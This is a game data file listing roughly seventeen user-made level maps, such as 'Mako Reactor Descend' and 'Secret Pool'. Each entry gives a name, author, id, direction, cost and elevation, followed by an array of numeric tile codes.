maps.push({name="Mako Reactor Descend",author="Block",id="#1660880254",direction="right",cost=351,elevation=-11,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,24,24,24,91,0,24,1,1,1,1,1,1,1,1,1,1,1,3,3,1,24,24,24,24,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,1,95,95,24,24,1,0,0,94,5,5,5,5,5,5,5,1,1,1,1,1,24,24,1,1,1,0,0,0,0,0,0,5,5,5,0,0,0,0,0,1,44,0,1,0,0,0,26,27,28,29,0,5,5,5,0,9,9,9,9,1,44,0,1,1,1,1,25,0,0,30,0,5,5,5,0,9,11,11,11,1,44,0,1,40,40,40,105,5,5,45,5,5,5,5,7,9,11,13,13,1,44,0,1,41,1,39,105,94,5,45,5,5,5,5,7,9,11,13,2,1,44,0,0,41,1,38,105,5,5,45,5,5,5,5,7,9,11,13,2,1,44,0,0,42,1,37,105,105,105,45,5,5,5,5,7,9,11,13,13,1,44,43,42,42,1,37,1,1,1,31,105,25,25,0,0,9,11,11,11,1,1,1,1,1,1,37,0,0,0,32,105,25,25,0,0,9,7,7,7,1,1,116,116,116,0,36,0,0,0,33,105,25,25,0,0,0,13,13,13,1,1,116,1,1,1,36,35,35,34,34,105,25,25,0,0,0,15,15,15,1,1,116,114,112,111,110,109,108,107,106,105,25,25,0,0,0,15,17,17,1,1,36,36,0,0,32,32,0,0,27,27,25,25,0,0,0,15,17,93,1,1,36,36,0,0,32,32,0,0,27,27,25,25,77,77,77,15,17,17,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,1,1,1]});
maps.push({name="FFXII Eastersand",author="Block",id="#1660881530",direction="forward",cost=525,elevation=-6,map=[0,21,21,21,21,21,95,21,21,2,2,21,21,95,21,21,21,21,21,0,0,94,21,21,21,21,95,21,21,21,21,21,21,95,21,21,21,21,94,0,0,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,21,0,0,21,1,93,21,19,17,15,15,15,15,15,15,15,15,15,15,1,21,0,1,21,1,21,19,19,17,15,90,15,90,15,90,15,90,15,90,1,21,1,1,21,1,17,17,17,17,15,15,90,15,90,15,94,15,90,15,1,21,1,1,21,1,15,15,15,15,15,15,15,15,15,15,15,15,15,15,1,21,1,115,55,115,95,66,73,73,73,73,73,73,73,73,73,73,73,67,115,55,115,115,55,115,95,66,73,73,73,73,73,73,73,73,73,73,73,67,115,55,115,115,55,115,95,66,73,73,73,73,73,73,73,73,73,73,73,67,115,55,115,115,55,115,95,66,73,73,73,73,73,73,73,73,73,73,73,67,115,55,115,115,55,1,15,15,16,17,18,20,22,24,22,20,18,18,16,15,1,55,115,115,55,1,15,15,16,17,18,20,22,93,22,20,18,18,16,16,1,55,115,115,55,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,55,115,115,55,55,55,55,55,21,21,21,21,55,55,55,55,55,55,55,55,55,115,115,55,55,55,55,55,21,21,21,21,55,55,55,55,55,55,55,55,55,115,1,23,23,23,55,55,21,21,21,21,55,55,21,21,21,21,21,21,21,1,1,23,24,1,115,115,1,1,1,1,55,55,1,90,21,23,23,23,90,1,1,23,94,1,15,15,1,1,1,1,92,92,1,90,21,23,94,23,21,1,1,1,1,1,2,2,1,1,1,1,21,21,1,1,1,1,1,1,1,1]});
maps.push({name="Mako Reactor Ascend",author="Block",id="#1660881733",direction="forward",cost=389,elevation=19,map=[1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,2,2,0,0,0,24,24,24,24,24,24,24,24,128,24,24,1,1,1,1,5,5,1,1,1,24,24,24,24,24,24,24,24,128,24,24,91,24,12,32,32,33,33,13,18,127,127,1,1,1,1,1,1,1,1,1,1,24,12,0,5,5,0,13,18,24,24,1,13,13,13,13,13,12,12,12,1,24,12,0,5,5,0,13,18,24,24,1,14,14,14,14,14,11,11,11,1,24,12,0,5,5,0,3,18,24,24,1,15,15,15,15,15,10,10,10,1,24,12,0,5,5,0,0,18,24,24,1,16,16,16,16,16,9,9,9,1,24,12,0,5,5,0,0,18,24,24,1,17,17,17,17,17,8,8,8,1,24,12,0,3,5,0,0,18,24,24,1,18,18,18,18,18,8,8,8,1,24,52,52,52,52,18,18,18,24,24,1,19,19,19,19,19,7,7,7,1,24,19,0,0,0,0,0,0,127,127,1,20,20,20,20,20,20,5,5,1,24,19,19,19,40,40,40,40,24,24,1,21,21,21,20,20,20,5,5,24,24,24,0,0,0,0,0,41,24,24,1,22,22,21,20,20,20,5,5,24,24,24,0,0,44,43,42,41,24,24,1,23,23,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,95,24,24,24,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,95,24,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,88,24,24,24,24,129,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,129,24,24,24,24,24,24,24,24,24,24,24,2,2,24,24]});
maps.push({name="Big Bridge",author="TF2 Pencil",id="#1660891049",direction="forward",cost=152,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,40,125,40,40,40,40,125,40,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Up to the trigger",author="TF2 Pencil",id="#1660891186",direction="forward",cost=128,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,24,132,24,0,0,24,24,24,14,14,14,9,9,0,0,0,0,0,0,0,24,24,24,24,24,24,97,24,15,14,14,9,9,0,0,0,0,0,0,0,0,24,24,0,0,24,24,24,16,14,14,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,24,17,14,14,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,24,18,14,14,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,23,19,14,14,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,22,20,14,14,4,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,21,21,14,14,4,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,9,131,9,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,9,9,9]});
maps.push({name="Diving pool",author="TF2 Pencil",id="#1660891297",direction="right",cost=610,elevation=-15,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,129,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,129,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,2,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,2,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,129,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,129,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,0,24,24,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Second Floor",author="TF2 Pencil",id="#1660893367",direction="forward",cost=214,elevation=19,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,92,5,92,5,92,5,92,5,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="Figure 8",author="TF2 Pencil",id="#1660893431",direction="forward",cost=102,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,18,18,18,18,17,17,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,15,15,15,0,0,0,0,0,0,0,14,14,14,14,54,54,14,14,14,14,15,15,0,0,0,0,0,0,15,15,14,14,14,14,54,54,14,14,14,14,0,0,0,0,0,0,0,15,15,15,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,17,17,18,18,18,18,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RoomFromMinasMorgul",author="fara",id="#1660903761",direction="left",cost=261,elevation=-14,map=[0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0,1,22,22,22,22,22,22,22,22,22,22,22,22,22,1,22,22,1,0,0,1,8,8,8,8,8,8,8,0,8,8,8,22,22,98,22,22,1,0,0,1,0,18,0,8,8,8,8,8,8,8,8,22,22,98,22,22,1,0,0,1,0,0,0,0,0,8,8,8,8,8,8,22,22,1,99,22,1,0,0,1,18,0,0,0,0,8,8,0,0,0,0,22,22,1,1,1,1,0,0,1,0,0,0,0,0,8,8,0,0,0,0,0,22,1,0,0,0,0,0,1,18,18,0,0,0,8,0,0,0,0,0,22,22,1,0,0,0,0,0,1,18,18,0,0,0,8,8,0,0,0,0,21,21,1,0,0,0,0,0,1,97,18,0,0,0,0,8,0,0,0,0,20,20,1,0,0,0,0,0,1,18,18,18,18,18,8,8,18,0,18,18,19,19,1,0,0,0,0,0,1,18,18,18,0,18,8,0,0,18,18,18,19,19,1,0,0,0,0,0,1,0,0,0,0,0,8,8,0,0,0,0,19,19,1,0,0,0,0,0,1,15,0,0,0,0,8,8,0,0,0,0,19,19,1,0,0,0,1,1,1,0,0,0,0,0,8,0,0,0,0,0,0,19,1,0,0,0,8,8,1,11,0,0,0,0,8,8,0,0,0,0,19,19,1,0,0,0,2,8,96,8,8,8,8,8,8,8,8,8,8,8,19,19,1,0,0,0,2,8,96,8,8,8,8,8,8,95,95,95,8,8,19,19,1,0,0,0,8,8,1,8,8,8,8,8,8,95,93,95,8,8,19,19,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0]});
maps.push({name="enter Amon Amarth",author="fara",id="#1660905134",direction="forward",cost=352,elevation=11,map=[1,24,22,12,100,12,19,16,16,7,6,5,5,2,2,5,5,22,24,1,1,24,22,12,12,12,19,16,16,7,6,6,6,5,5,5,6,22,24,1,1,24,22,12,12,12,19,19,16,7,7,6,6,6,6,6,6,22,24,1,1,24,22,13,13,13,13,19,16,7,7,7,6,6,6,6,6,22,24,1,1,24,22,13,13,13,13,19,16,7,7,7,7,7,6,6,6,22,24,1,1,24,22,22,13,13,13,19,16,7,7,7,7,7,7,6,22,24,24,1,1,24,24,22,13,13,13,19,16,16,8,8,7,7,7,7,22,24,1,0,0,1,24,22,14,14,14,19,19,16,8,8,8,8,8,7,22,24,1,0,0,1,24,22,14,14,14,14,19,16,8,8,8,8,8,8,22,24,1,0,0,1,24,22,14,14,14,14,19,16,3,8,16,8,8,22,24,1,0,0,0,1,24,22,15,15,15,15,19,16,13,16,16,8,8,22,24,1,0,0,0,1,24,22,15,15,15,15,19,16,13,16,10,49,8,22,24,1,0,0,0,1,24,22,22,15,15,15,19,13,13,16,11,16,49,22,24,1,0,0,0,1,24,24,22,16,16,16,19,13,13,13,12,11,10,22,24,1,0,0,0,0,1,24,22,16,16,16,19,14,14,14,13,12,12,22,24,1,0,0,0,0,1,24,22,16,16,16,16,15,15,15,14,19,22,24,24,1,0,0,0,0,1,24,22,16,16,16,16,16,16,15,15,19,22,24,1,0,0,0,0,0,1,24,22,16,16,16,16,16,16,16,16,22,24,24,1,0,0,0,0,0,1,24,22,16,16,16,16,16,16,16,16,22,24,1,0,0,0,0,0,0,1,24,24,16,16,16,2,2,16,16,16,22,24,1,0,0,0,0]});
maps.push({name="simple reward",author="fara",id="#1660906099",direction="forward",cost=267,elevation=0,map=[0,0,0,0,0,0,67,8,28,2,2,28,8,67,0,0,0,0,0,0,0,67,0,0,0,0,0,28,28,28,28,28,28,0,0,0,0,0,67,0,30,10,30,0,0,0,0,28,28,90,28,86,28,0,0,0,0,30,10,30,30,100,30,0,0,0,0,28,28,28,28,28,28,0,0,0,0,30,100,30,30,30,30,0,0,0,0,28,28,28,28,28,28,0,0,0,0,30,30,30,0,30,0,0,0,0,67,8,28,28,28,28,8,67,0,0,0,0,30,0,0,29,0,0,0,0,8,28,28,28,88,28,28,8,0,0,0,0,29,0,0,28,0,0,0,0,28,28,86,28,28,90,90,28,0,0,0,0,28,0,14,48,14,0,0,0,28,28,28,28,28,28,28,28,0,0,0,14,48,14,14,48,48,48,48,48,48,49,49,48,48,49,49,48,48,48,48,48,48,14,93,48,48,48,48,48,48,49,49,48,48,49,49,48,48,48,48,48,48,94,14,48,14,0,0,0,28,28,90,28,87,28,28,28,0,0,0,14,48,14,0,28,0,0,0,0,28,28,28,28,28,28,28,28,0,0,0,0,28,0,0,29,0,0,0,0,8,28,28,13,13,28,28,8,0,0,0,0,29,0,0,30,0,0,0,0,67,8,28,13,13,90,8,67,0,0,0,0,30,0,30,30,30,0,0,0,0,28,28,3,3,28,28,0,0,0,0,30,30,30,30,100,30,0,0,0,0,28,88,28,28,28,28,0,0,0,0,30,100,30,30,10,30,0,0,0,0,28,28,28,28,28,28,0,0,0,0,30,10,30,0,67,0,0,0,0,0,28,28,28,28,86,28,0,0,0,0,0,67,0,0,0,0,0,0,0,67,8,28,2,2,28,8,67,0,0,0,0,0,0]});
maps.push({name="generic01dotvtf",author="fara",id="#1660907421",direction="forward",cost=208,elevation=7,map=[17,2,2,17,0,0,0,0,0,0,0,0,0,0,51,11,11,51,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,0,51,125,125,51,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,51,11,11,51,0,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,51,51,51,51,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,51,51,51,51,51,51,0,0,0,0,0,17,17,17,17,0,0,0,0,0,51,51,51,51,51,51,0,0,0,0,0,17,17,17,17,0,0,24,24,24,51,51,17,17,51,51,24,0,0,0,0,17,127,127,17,0,0,24,24,24,51,51,125,125,51,51,24,0,0,0,0,17,17,17,17,0,0,24,24,24,51,51,17,17,51,51,24,0,0,0,0,0,0,0,0,0,0,24,24,0,51,51,51,51,51,51,0,0,0,0,0,0,0,0,0,0,0,24,24,0,51,51,51,51,51,51,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,51,51,51,51,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,51,51,51,51,0,0,0,0,0,0,16,16,16,16,0,0,24,24,0,0,51,51,51,51,0,0,0,0,0,0,17,17,17,17,0,0,24,24,0,0,51,51,51,51,0,0,0,0,0,0,17,131,131,17,0,0,24,24,0,0,11,132,132,11,0,0,0,0,0,0,17,17,17,17,0,0,24,24,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,2,2,24,0,0]});
maps.push({name="Split Hold",author="MoistNoodlez",id="#1660948166",direction="forward",cost=194,elevation=0,map=[1,1,1,0,0,0,0,0,1,2,2,1,0,0,0,0,0,1,1,1,1,137,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,137,1,1,14,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,14,1,1,13,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,15,1,1,12,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,16,1,1,11,1,0,0,0,0,0,1,14,14,1,0,0,0,0,0,1,17,1,1,10,1,0,0,0,0,0,1,136,136,1,0,0,0,0,0,1,18,1,1,9,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,1,19,1,1,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,20,1,1,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,1,1,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,1,1,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,1,1,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,1,1,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,20,1,1,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,1,1,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,18,1,1,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,1,1,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,1,1,13,14,95,95,14,0,0,14,14,14,14,0,0,14,95,95,14,15,1,1,14,14,95,95,14,14,14,14,2,2,14,14,14,14,95,95,14,14,1]});
maps.push({name="Secret Pool",author="MoistNoodlez",id="#1660949561",direction="forward",cost=335,elevation=0,map=[0,0,0,0,0,19,14,14,14,2,2,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,90,14,14,14,14,14,90,19,0,0,0,0,0,0,0,0,0,0,19,14,14,66,66,127,66,66,14,19,0,0,0,0,0,0,0,0,0,0,19,14,90,66,66,127,66,66,90,19,14,93,14,93,0,0,0,0,0,0,19,14,14,66,66,66,66,66,14,19,14,14,14,14,0,0,0,0,0,0,19,14,90,66,66,66,66,66,90,19,14,93,14,93,0,0,0,0,0,0,19,14,14,66,66,66,66,66,14,19,14,14,14,14,0,0,0,0,0,0,19,14,90,66,66,66,66,66,66,19,14,66,14,94,0,0,0,0,0,0,19,14,14,66,66,66,66,66,66,19,14,69,14,14,0,0,0,0,0,0,19,14,90,66,66,66,66,66,66,19,14,69,14,94,0,0,0,0,0,0,19,14,14,66,66,66,66,66,66,19,14,69,14,14,0,0,0,0,0,0,19,14,90,66,66,66,66,66,66,19,14,69,14,94,0,0,0,0,0,0,19,14,14,66,66,66,66,66,66,69,69,69,14,14,0,0,0,0,0,0,19,14,90,14,90,14,90,14,90,19,14,14,14,94,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,14,14,14,14,14,14,14,19,0,0,0,0,0,0,0,0,0,0,19,14,14,14,2,2,14,14,14,19,0,0,0,0,0]});
maps.push({name="PoopSpiral EasyFlush",author="MoistNoodlez",id="#1660950656",direction="forward",cost=326,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,4,2,2,1,0,0,0,0,0,93,93,93,0,0,0,0,0,0,0,1,92,45,45,1,0,0,0,0,93,59,59,59,58,58,57,90,57,56,56,56,45,45,45,1,0,0,0,0,93,59,94,58,58,58,57,57,57,56,56,56,45,45,45,1,0,0,0,0,93,59,59,94,45,45,45,45,45,45,55,55,45,46,46,1,0,0,0,0,0,90,58,45,45,45,45,45,45,45,55,90,45,46,46,1,0,0,0,0,0,58,58,45,48,48,47,47,47,45,55,55,45,46,46,1,0,0,0,0,0,58,58,45,48,48,47,47,47,45,54,54,45,90,47,1,0,0,0,0,0,57,57,45,48,48,45,90,47,45,54,54,45,47,47,1,0,0,0,0,0,57,57,45,90,49,45,47,47,45,54,54,45,47,47,1,0,0,0,0,0,57,57,45,49,49,45,47,47,45,90,53,81,48,90,1,0,0,0,0,0,56,56,45,49,49,45,46,46,45,53,53,81,48,48,1,0,0,0,0,0,56,90,45,50,50,45,45,45,45,53,53,81,48,48,1,0,0,0,0,0,56,56,45,50,50,51,45,45,52,52,52,81,49,49,1,0,0,0,0,0,55,55,45,90,50,51,45,45,52,52,90,81,49,49,1,0,0,0,0,0,55,55,84,84,84,12,45,45,12,84,84,81,49,49,1,0,0,0,0,0,55,55,82,82,82,12,45,45,12,82,82,82,50,50,1,0,0,0,0,0,54,54,54,53,53,53,45,45,52,51,51,51,50,50,1,0,0,0,0,0,54,54,90,53,53,53,45,45,52,51,51,51,50,90,1,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0]});
maps.push({name="Moldy Cheese",author="MoistNoodlez",id="#1660951741",direction="forward",cost=357,elevation=2,map=[0,0,1,1,2,2,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,1,1,54,54,54,54,54,1,1,1,1,1,1,1,1,0,0,0,0,1,1,54,54,36,36,54,54,54,54,54,54,54,54,93,1,0,0,0,0,1,54,54,36,36,36,36,36,36,36,36,36,36,36,54,1,0,0,0,0,1,54,54,54,36,58,58,58,58,36,36,36,36,58,54,1,0,0,0,0,1,54,58,54,58,58,58,97,58,58,58,58,58,58,54,1,1,0,0,0,1,54,58,54,58,36,36,58,58,58,36,58,58,36,54,93,1,1,0,0,1,54,36,54,54,36,58,58,58,58,58,58,58,36,36,54,1,1,0,0,1,54,36,36,54,58,58,58,58,58,58,97,58,58,58,54,94,1,0,0,1,54,58,58,54,36,36,58,97,58,58,58,58,58,58,58,54,1,1,0,1,54,58,58,54,54,36,58,36,36,58,58,58,58,58,36,54,94,1,0,1,54,93,58,58,54,58,58,36,36,58,58,58,58,58,36,36,54,1,0,1,54,58,58,36,54,54,58,58,58,58,58,97,58,58,58,58,54,1,1,1,94,54,58,36,36,54,58,58,58,58,58,58,58,58,97,58,54,54,1,1,1,54,54,58,58,54,54,58,36,36,58,36,58,58,36,58,58,54,1,0,1,93,54,54,58,58,54,58,36,36,97,58,58,58,54,54,54,54,1,0,1,1,1,94,54,58,54,58,58,58,58,58,36,54,16,16,1,1,1,0,0,0,1,1,93,54,54,54,54,58,58,58,58,54,16,16,16,16,16,0,0,0,0,1,1,1,1,1,94,54,54,54,54,54,1,16,16,96,96,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2]});
maps.push({name="KeepOnTPing",author="MoistNoodlez",id="#1660952919",direction="forward",cost=245,elevation=0,map=[0,0,0,0,0,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,1,1,1,1,1,1,0,0,0,0,0,1,14,14,14,14,14,14,14,1,100,14,94,14,132,1,0,0,0,0,0,1,14,14,14,14,14,14,14,1,97,14,93,14,132,1,0,0,0,0,0,1,132,132,132,132,132,132,132,1,131,14,94,14,132,1,0,0,0,0,0,1,14,14,14,14,14,14,14,1,1,1,1,1,1,1,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,131,131,96,96,131,131,131,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,2,2,14,93,14,1,0,0,0,0,0,0]});
